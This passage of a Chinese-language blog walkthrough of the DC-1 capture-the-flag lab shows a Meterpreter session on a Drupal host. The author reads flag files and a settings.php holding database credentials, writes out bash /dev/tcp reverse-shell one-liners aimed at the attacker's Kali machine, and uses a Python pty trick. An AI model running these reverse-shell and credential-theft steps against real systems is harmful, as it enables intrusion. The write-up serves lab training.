class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="built_in">pwd</span></span><br><span class="line">/var/www</span><br><span class="line">meterpreter &gt; ls</span><br><span class="line">Listing: /var/www</span><br><span class="line">=================</span><br><span class="line"></span><br><span class="line">Mode              Size   Type  Last modified              Name</span><br><span class="line">----              ----   ----  -------------              ----</span><br><span class="line">100644/rw-r--r--  174    fil   2013-11-20 15:45:59 -0500  .gitignore</span><br><span class="line">100644/rw-r--r--  5767   fil   2013-11-20 15:45:59 -0500  .htaccess</span><br><span class="line">100644/rw-r--r--  1481   fil   2013-11-20 15:45:59 -0500  COPYRIGHT.txt</span><br><span class="line">100644/rw-r--r--  1451   fil   2013-11-20 15:45:59 -0500  INSTALL.mysql.txt</span><br><span class="line">100644/rw-r--r--  1874   fil   2013-11-20 15:45:59 -0500  INSTALL.pgsql.txt</span><br><span class="line">100644/rw-r--r--  1298   fil   2013-11-20 15:45:59 -0500  INSTALL.sqlite.txt</span><br><span class="line">100644/rw-r--r--  17861  fil   2013-11-20 15:45:59 -0500  INSTALL.txt</span><br><span class="line">100755/rwxr-xr-x  18092  fil   2013-11-01 06:14:15 -0400  LICENSE.txt</span><br><span class="line">100644/rw-r--r--  8191   fil   2013-11-20 15:45:59 -0500  MAINTAINERS.txt</span><br><span class="line">100644/rw-r--r--  5376   fil   2013-11-20 15:45:59 -0500  README.txt</span><br><span class="line">100644/rw-r--r--  9642   fil   2013-11-20 15:45:59 -0500  UPGRADE.txt</span><br><span class="line">100644/rw-r--r--  6604   fil   2013-11-20 15:45:59 -0500  authorize.php</span><br><span class="line">100644/rw-r--r--  720    fil   2013-11-20 15:45:59 -0500  cron.php</span><br><span class="line">100644/rw-r--r--  52     fil   2019-02-19 08:20:46 -0500  flag1.txt</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  includes</span><br><span class="line">100644/rw-r--r--  529    fil   2013-11-20 15:45:59 -0500  index.php</span><br><span class="line">100644/rw-r--r--  703    fil   2013-11-20 15:45:59 -0500  install.php</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  misc</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  modules</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  profiles</span><br><span class="line">100644/rw-r--r--  1561   fil   2013-11-20 15:45:59 -0500  robots.txt</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  scripts</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  sites</span><br><span class="line">40755/rwxr-xr-x   4096   dir   2013-11-20 15:45:59 -0500  themes</span><br><span class="line">100644/rw-r--r--  19941  fil   2013-11-20 15:45:59 -0500  update.php</span><br><span class="line">100644/rw-r--r--  2178   fil   2013-11-20 15:45:59 -0500  web.config</span><br><span class="line">100644/rw-r--r--  417    fil   2013-11-20 15:45:59 -0500  xmlrpc.php</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure><h3 id="4-发现flag1-txt，看看有没有权限看"><a href="#4-发现flag1-txt，看看有没有权限看" class="headerlink" title="4.发现flag1.txt，看看有没有权限看"></a>4.发现flag1.txt，看看有没有权限看</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; cat flag1.txt</span><br><span class="line">Every good CMS needs a config file - and so <span class="keyword">do</span> you.</span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure><p><code>看是能看，霸特下一个flag在哪？？？根据提示，每一个好的cms需要一个配置文件，你也是。。。😥</code></p><p><code>查看网站配置文件，是一个xml文件，啥也没有！</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; cat web.config</span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;configuration&gt;</span><br><span class="line">  &lt;system.webServer&gt;</span><br><span class="line">    &lt;!-- Don<span class="string">&#x27;t show directory listings for URLs which map to a directory. --&gt;</span></span><br><span class="line"><span class="string">    &lt;directoryBrowse enabled=&quot;false&quot; /&gt;</span></span><br><span class="line"><span class="string">    &lt;rewrite&gt;</span></span><br><span class="line"><span class="string">      &lt;rules&gt;</span></span><br><span class="line"><span class="string">        &lt;rule name=&quot;Protect files and directories from prying eyes&quot; stopProcessing=&quot;true&quot;&gt;</span></span><br><span class="line"><span class="string">          &lt;match url=&quot;\.(engine|inc|info|install|make|module|profile|test|po|sh|.*sql|theme|tpl(\.php)?|xtmpl)$|^(\..*|Entries.*|Repository|Root|Tag|Template)$&quot; /&gt;</span></span><br><span class="line"><span class="string">          &lt;action type=&quot;CustomResponse&quot; statusCode=&quot;403&quot; subStatusCode=&quot;0&quot; statusReason=&quot;Forbidden&quot; statusDescription=&quot;Access is forbidden.&quot; /&gt;</span></span><br><span class="line"><span class="string">        &lt;/rule&gt;</span></span><br><span class="line"><span class="string">        &lt;rule name=&quot;Force simple error message for requests for non-existent favicon.ico&quot; stopProcessing=&quot;true&quot;&gt;</span></span><br><span class="line"><span class="string">          &lt;match url=&quot;favicon\.ico&quot; /&gt;</span></span><br><span class="line"><span class="string">          &lt;action type=&quot;CustomResponse&quot; statusCode=&quot;404&quot; subStatusCode=&quot;1&quot; statusReason=&quot;File Not Found&quot; statusDescription=&quot;The requested file favicon.ico was not found&quot; /&gt;</span></span><br><span class="line"><span class="string">          &lt;conditions&gt;</span></span><br><span class="line"><span class="string">            &lt;add input=&quot;&#123;REQUEST_FILENAME&#125;&quot; matchType=&quot;IsFile&quot; negate=&quot;true&quot; /&gt;</span></span><br><span class="line"><span class="string">          &lt;/conditions&gt;</span></span><br><span class="line"><span class="string">        &lt;/rule&gt;</span></span><br><span class="line"><span class="string">        &lt;!-- Rewrite URLs of the form &#x27;</span>x<span class="string">&#x27; to the form &#x27;</span>index.php?q=x<span class="string">&#x27;. --&gt;</span></span><br><span class="line"><span class="string">        &lt;rule name=&quot;Short URLs&quot; stopProcessing=&quot;true&quot;&gt;</span></span><br><span class="line"><span class="string">          &lt;match url=&quot;^(.*)$&quot; ignoreCase=&quot;false&quot; /&gt;</span></span><br><span class="line"><span class="string">          &lt;conditions&gt;</span></span><br><span class="line"><span class="string">            &lt;add input=&quot;&#123;REQUEST_FILENAME&#125;&quot; matchType=&quot;IsFile&quot; ignoreCase=&quot;false&quot; negate=&quot;true&quot; /&gt;</span></span><br><span class="line"><span class="string">            &lt;add input=&quot;&#123;REQUEST_FILENAME&#125;&quot; matchType=&quot;IsDirectory&quot; ignoreCase=&quot;false&quot; negate=&quot;true&quot; /&gt;</span></span><br><span class="line"><span class="string">            &lt;add input=&quot;&#123;URL&#125;&quot; pattern=&quot;^/favicon.ico$&quot; ignoreCase=&quot;false&quot; negate=&quot;true&quot; /&gt;</span></span><br><span class="line"><span class="string">          &lt;/conditions&gt;</span></span><br><span class="line"><span class="string">          &lt;action type=&quot;Rewrite&quot; url=&quot;index.php?q=&#123;R:1&#125;&quot; appendQueryString=&quot;true&quot; /&gt;</span></span><br><span class="line"><span class="string">        &lt;/rule&gt;</span></span><br><span class="line"><span class="string">      &lt;/rules&gt;</span></span><br><span class="line"><span class="string">    &lt;/rewrite&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;httpErrors&gt;</span></span><br><span class="line"><span class="string">      &lt;remove statusCode=&quot;404&quot; subStatusCode=&quot;-1&quot; /&gt;</span></span><br><span class="line"><span class="string">      &lt;error statusCode=&quot;404&quot; prefixLanguageFilePath=&quot;&quot; path=&quot;/index.php&quot; responseMode=&quot;ExecuteURL&quot; /&gt;</span></span><br><span class="line"><span class="string">    &lt;/httpErrors&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;defaultDocument&gt;</span></span><br><span class="line"><span class="string">      &lt;!-- Set the default document --&gt;</span></span><br><span class="line"><span class="string">      &lt;files&gt;</span></span><br><span class="line"><span class="string">        &lt;remove value=&quot;index.php&quot; /&gt;</span></span><br><span class="line"><span class="string">        &lt;add value=&quot;index.php&quot; /&gt;</span></span><br><span class="line"><span class="string">      &lt;/files&gt;</span></span><br><span class="line"><span class="string">    &lt;/defaultDocument&gt;</span></span><br><span class="line"><span class="string">  &lt;/system.webServer&gt;</span></span><br><span class="line"><span class="string">&lt;/configuration&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">meterpreter &gt; </span></span><br></pre></td></tr></table></figure><p><code>换个思路，竟然是web application那就有数据库，那么数据库的密码是以明文的方式写在配置文件中</code></p><p><code>一番苦逼的查找，他在sites/default/settings.php中</code></p><p><code>并且也看到了flag2与提示信息，内容为：暴力破解与目录攻击不是你访问系统的唯一途径，但是你可以尝试一下</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; cat settings.php</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> *</span><br><span class="line"> * flag2</span><br><span class="line"> * Brute force and dictionary attacks aren<span class="string">&#x27;t the</span></span><br><span class="line"><span class="string"> * only ways to gain access (and you WILL need access).</span></span><br><span class="line"><span class="string"> * What can you do with these credentials?</span></span><br><span class="line"><span class="string"> *</span></span><br><span class="line"><span class="string"> */</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$databases = array (</span></span><br><span class="line"><span class="string">  &#x27;</span>default<span class="string">&#x27; =&gt; </span></span><br><span class="line"><span class="string">  array (</span></span><br><span class="line"><span class="string">    &#x27;</span>default<span class="string">&#x27; =&gt; </span></span><br><span class="line"><span class="string">    array (</span></span><br><span class="line"><span class="string">      &#x27;</span>database<span class="string">&#x27; =&gt; &#x27;</span>drupaldb<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">      &#x27;</span>username<span class="string">&#x27; =&gt; &#x27;</span>dbuser<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">      &#x27;</span>password<span class="string">&#x27; =&gt; &#x27;</span>R0ck3t<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">      &#x27;</span>host<span class="string">&#x27; =&gt; &#x27;</span>localhost<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">      &#x27;</span>port<span class="string">&#x27; =&gt; &#x27;</span><span class="string">&#x27;,</span></span><br><span class="line"><span class="string">      &#x27;</span>driver<span class="string">&#x27; =&gt; &#x27;</span>mysql<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">      &#x27;</span>prefix<span class="string">&#x27; =&gt; &#x27;</span><span class="string">&#x27;,</span></span><br><span class="line"><span class="string">    ),</span></span><br><span class="line"><span class="string">  ),</span></span><br><span class="line"><span class="string">);</span></span><br></pre></td></tr></table></figure><h2 id="0x06-登入数据库"><a href="#0x06-登入数据库" class="headerlink" title="0x06.登入数据库"></a>0x06.登入数据库</h2><p><code>由于meterpreter不能进行mysql登入，所以进入到常规shell下，发现3306是开放的，并且只允许本地连接</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3903 created.</span><br><span class="line">Channel 7 created.</span><br><span class="line">netstat -apntu</span><br><span class="line">(Not all processes could be identified, non-owned process info</span><br><span class="line"> will not be shown, you would have to be root to see it all.)</span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name</span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp        0      0 0.0.0.0:41087           0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -               </span><br><span class="line">tcp        0      0 192.168.1.3:52082       192.168.1.6:4444        ESTABLISHED 3837/php        </span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      -               </span><br><span class="line">tcp6       0      0 ::1:25                  :::*                    LISTEN      -               </span><br><span class="line">tcp6       0      0 :::111                  :::*                    LISTEN      -               </span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      -               </span><br><span class="line">tcp6       0      0 :::36531                :::*                    LISTEN      -               </span><br><span class="line">tcp6       1      0 192.168.1.3:80          192.168.1.6:40931       CLOSE_WAIT  -               </span><br><span class="line">udp        0      0 0.0.0.0:68              0.0.0.0:*                           -               </span><br><span class="line">udp        0      0 0.0.0.0:49260           0.0.0.0:*                           -               </span><br><span class="line">udp        0      0 0.0.0.0:111             0.0.0.0:*                           -               </span><br><span class="line">udp        0      0 0.0.0.0:783             0.0.0.0:*                           -               </span><br><span class="line">udp        0      0 127.0.0.1:815           0.0.0.0:*                           -               </span><br><span class="line">udp        0      0 0.0.0.0:50997           0.0.0.0:*                           -               </span><br><span class="line">udp6       0      0 :::48070                :::*                                -               </span><br><span class="line">udp6       0      0 :::111                  :::*                                -   </span><br><span class="line">udp6       0      0 :::62200                :::*                                -               </span><br><span class="line">udp6       0      0 :::783                  :::*                                -         </span><br></pre></td></tr></table></figure><p><code>尝试登入，发现在当前shell下是无法登入的</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -udbuser -pR0ck3t</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>由于这个shell是http方式建立的，不是持久连接，所以下面建立持久连接</code></p><h2 id="0x07-反弹shell"><a href="#0x07-反弹shell" class="headerlink" title="0x07.反弹shell"></a>0x07.反弹shell</h2><p><code>由于需要建立持久连接，所以尝试将DC1的shell反弹给kali</code></p><h3 id="1-kali先监听6666端口"><a href="#1-kali先监听6666端口" class="headerlink" title="1.kali先监听6666端口"></a>1.kali先监听6666端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-DC1执行"><a href="#2-DC1执行" class="headerlink" title="2.DC1执行"></a>2.DC1执行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.6/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><code>咦，报错了😱换个方法</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3911 created.</span><br><span class="line">Channel 8 created.</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.1.6/6666 0&gt;&amp;1</span><br><span class="line">/bin/sh: 2: Syntax error: Bad fd numbermeterpreter &gt; </span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.6/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure><p><code>也不行，我giao</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3915 created.</span><br><span class="line">Channel 10 created.</span><br><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.6/6666 0&gt;&amp;1                                                                                                      </span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>再换个方法，此方法为使用python脚本先建立交互shell再反弹shell给kali</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure><p><code>这回成功了，成功建立交互式shell</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3924 created.</span><br><span class="line">Channel 12 created.</span><br><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">www-data@DC-1:/var/www$ /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.6/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure><h3 id="3-反弹"><a href="#3-反弹" class="headerlink" title="3.反弹"></a>3.反弹</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [192.168.1.6] from (UNKNOWN) [192.168.1.3] 51322</span><br><span class="line">www-data@DC-1:/var/www$ </span><br></pre></td></tr></table></figure><p><code>反弹成功再次登入mysql</code></p><h2 id="0x08-再次登入mysql"><a href="#0x08-再次登入mysql" class="headerlink" title="0x08.再次登入mysql"></a>0x08.再次登入mysql</h2><p><code>然而在反弹给kali的shell不能登陆到mysql（我giao，这是什么原理？？？？？？）</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~<span class="comment"># nc -nvlp 6666</span></span><br><span class="line">listening on [any] 6666 ...</span><br><span class="line">connect to [192.168.1.6] from (UNKNOWN) [192.168.1.3] 51322</span><br><span class="line">www-data@DC-1:/var/www$ mysql -udbuser -pR0ck3t</span><br><span class="line">mysql -udbuser -pR0ck3t</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>但是在使用python脚本获得的交互式shell下却可以登入，菜狗一脸问号❓❓❓❓❓❓❓❓❓（我竟然饶了一圈。。。）</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 3960 created.</span><br><span class="line">Channel 16 created.</span><br><span class="line">python -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">www-data@DC-1:/var/www$ mysql -udbuser -pR0ck3t</span><br><span class="line">mysql -udbuser -pR0ck3t</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 16035</span><br><span class="line">Server version: 5.5.60-0+deb7u1 (Debian)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="1-查看数据库"><a href="#1-查看数据库" class="headerlink" title="1.查看数据库"></a>1.查看数据库</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br><span class="line">show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| drupaldb           |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br></pre></td></tr></table></figure><h3 id="2-使用drupaldb，查看表"><a href="#2-使用drupaldb，查看表" class="headerlink" title="2.使用drupaldb，查看表"></a>2.使用drupaldb，查看表</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use drupaldb     </span><br><span class="line">use drupaldb</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; show tables;    </span><br><span class="line">show tables;</span><br><span class="line">+-----------------------------+</span><br><span class="line">| Tables_in_drupaldb          |</span><br><span class="line">+-----------------------------+</span><br><span class="line">| actions                     |</span><br><span class="line">| authmap                     |</span><br><span class="line">| batch                       |</span><br><span class="line">| block                       |</span><br><span class="line">| block_custom                |</span><br><span class="line">| block_node_type             |</span><br><span class="line">| block_role                  |</span><br><span class="line">| blocked_ips                 |</span><br><span class="line">| cache                       |</span><br><span class="line">| cache_block                 |</span><br><span class="line">| cache_bootstrap             |</span><br><span class="line">| cache_field                 |</span><br><span class="line">| cache_filter                |</span><br><span class="line">| cache_form                  |</span><br><span class="line">| cache_image                 |</span><br><span class="line">| cache_menu                  |</span><br><span class="line">| cache_page                  |</span><br><span class="line">| cache_path                  |</span><br><span class="line">| cache_update                |</span><br><span class="line">| cache_views                 |</span><br><span class="line">| cache_views_data            |</span><br><span class="line">| comment                     |</span><br><span class="line">| ctools_css_cache            |</span><br><span class="line">| ctools_object_cache         |</span><br><span class="line">| date_format_locale          |</span><br><span class="line">| date_format_type            |</span><br><span class="line">| date_formats                |</span><br><span class="line">| field_config                |</span><br><span class="line">| field_config_instance       |</span><br><span class="line">| field_data_body             |</span><br><span class="line">| field_data_comment_body     |</span><br><span class="line">| field_data_field_image      |</span><br><span class="line">| field_data_field_tags       |</span><br><span class="line">| field_revision_body         |</span><br><span class="line">| field_revision_comment_body |</span><br><span class="line">| field_revision_field_image  |</span><br><span class="line">| field_revision_field_tags   |</span><br><span class="line">| file_managed                |</span><br><span class="line">| file_usage                  |</span><br><span class="line">| filter                      |</span><br><span class="line">| filter_format               |</span><br><span class="line">| flood                       |</span><br><span class="line">| <span class="built_in">history</span>                     |</span><br><span class="line">| image_effects               |</span><br><span class="line">| image_styles                |</span><br><span class="line">| menu_custom                 |</span><br><span class="line">| menu_links                  |</span><br><span class="line">| menu_router                 |</span><br><span class="line">| node                        |</span><br><span class="line">| node_access                 |</span><br><span class="line">| node_comment_statistics     |</span><br><span class="line">| node_revision               |</span><br><span class="line">| node_type                   |</span><br><span class="line">| queue                       |</span><br><span class="line">| rdf_mapping                 |</span><br><span class="line">| registry                    |</span><br><span class="line">| registry_file               |</span><br><span class="line">| role                        |</span><br><span class="line">| role_permission             |</span><br><span class="line">| search_dataset              |</span><br><span class="line">| search_index                |</span><br><span class="line">| search_node_links           |</span><br><span class="line">| search_total                |</span><br><span class="line">| semaphore                   |</span><br><span class="line">| sequences                   |</span><br><span class="line">| sessions                    |</span><br><span class="line">| shortcut_set                |</span><br><span class="line">| shortcut_set_users          |</span><br><span class="line">| system                      |</span><br><span class="line">| taxonomy_index              |</span><br><span class="line">| taxonomy_term_data          |</span><br><span class="line">| taxonomy_term_hierarchy     |</span><br><span class="line">| taxonomy_vocabulary         |</span><br><span class="line">| url_alias                   |</span><br><span class="line">| users                       |</span><br><span class="line">| users_roles                 |</span><br><span class="line">| variable                    |</span><br><span class="line">| views_display               |</span><br><span class="line">| views_view                  |</span><br><span class="line">| watchdog                    |</span><br><span class="line">+-----------------------------+</span><br><span class="line">80 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; 